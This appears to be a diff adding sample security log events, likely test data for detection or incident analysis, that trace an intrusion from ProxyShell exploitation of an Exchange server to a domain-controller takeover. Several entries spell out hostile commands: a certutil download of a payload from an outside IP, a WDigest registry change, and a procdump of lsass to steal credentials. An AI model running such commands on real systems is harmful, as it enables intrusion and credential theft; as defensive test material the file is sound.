@@ -1,0 +1,78 @@
+[
+  {
+    "timestamp": "2026-04-23T02:00:15Z",
+    "source_host": "EXCHANGE-01",
+    "source_ip": "10.10.1.20",
+    "dest_host": null,
+    "dest_ip": "91.234.56.78",
+    "event_type": "network",
+    "raw": "Outbound connection from OWA service to 91.234.56.78:443 - ProxyShell exploitation attempt CVE-2021-34473"
+  },
+  {
+    "timestamp": "2026-04-23T02:01:30Z",
+    "source_host": "EXCHANGE-01",
+    "source_ip": "10.10.1.20",
+    "event_type": "process",
+    "raw": "w3wp.exe spawned cmd.exe /c whoami - webshell activity detected on Exchange server"
+  },
+  {
+    "timestamp": "2026-04-23T02:02:45Z",
+    "source_host": "EXCHANGE-01",
+    "source_ip": "10.10.1.20",
+    "event_type": "file",
+    "raw": "File created: C:\\inetpub\\wwwroot\\aspnet_client\\discover.aspx - China Chopper webshell variant deployed"
+  },
+  {
+    "timestamp": "2026-04-23T02:05:10Z",
+    "source_host": "EXCHANGE-01",
+    "source_ip": "10.10.1.20",
+    "event_type": "process",
+    "raw": "certutil.exe -urlcache -split -f http://91.234.56.78/payload.exe C:\\Windows\\Temp\\svc.exe - LOLBin download"
+  },
+  {
+    "timestamp": "2026-04-23T02:06:00Z",
+    "source_host": "EXCHANGE-01",
+    "source_ip": "10.10.1.20",
+    "event_type": "process",
+    "raw": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 - WDigest credential caching enabled"
+  },
+  {
+    "timestamp": "2026-04-23T02:10:30Z",
+    "source_host": "EXCHANGE-01",
+    "source_ip": "10.10.1.20",
+    "event_type": "process",
+    "raw": "procdump.exe -ma lsass.exe C:\\Windows\\Temp\\debug.dmp - LSASS process dump for credential extraction"
+  },
+  {
+    "timestamp": "2026-04-23T02:15:22Z",
+    "source_host": "EXCHANGE-01",
+    "source_ip": "10.10.1.20",
+    "dest_host": "DC-PRIMARY",
+    "dest_ip": "10.10.1.5",
+    "event_type": "lateral",
+    "raw": "Pass-the-hash attack: NTLM hash used for SMB auth from EXCHANGE-01 to DC-PRIMARY using DA_admin account"
+  },
+  {
+    "timestamp": "2026-04-23T02:17:45Z",
+    "source_host": "DC-PRIMARY",
+    "source_ip": "10.10.1.5",
+    "event_type": "process",
+    "raw": "DCSync attack detected: replication request from non-DC host EXCHANGE-01 for domain CORP - Mimikatz lsadump::dcsync"
+  },
+  {
+    "timestamp": "2026-04-23T02:20:00Z",
+    "source_host": "DC-PRIMARY",
+    "source_ip": "10.10.1.5",
+    "event_type": "process",
+    "raw": "Golden ticket forged: krbtgt NTLM hash extracted, TGT generated for Administrator@CORP.LOCAL with 10-year validity"
+  },
+  {
+    "timestamp": "2026-04-23T02:30:00Z",
+    "source_host": "DC-PRIMARY",
+    "source_ip": "10.10.1.5",
+    "dest_host": null,
+    "dest_ip": "91.234.56.78",
+    "event_type": "network",
+    "raw": "DNS tunneling detected: high-entropy subdomain queries to c2.evil-domain.xyz - data exfiltration via DNS protocol"
+  }
+]
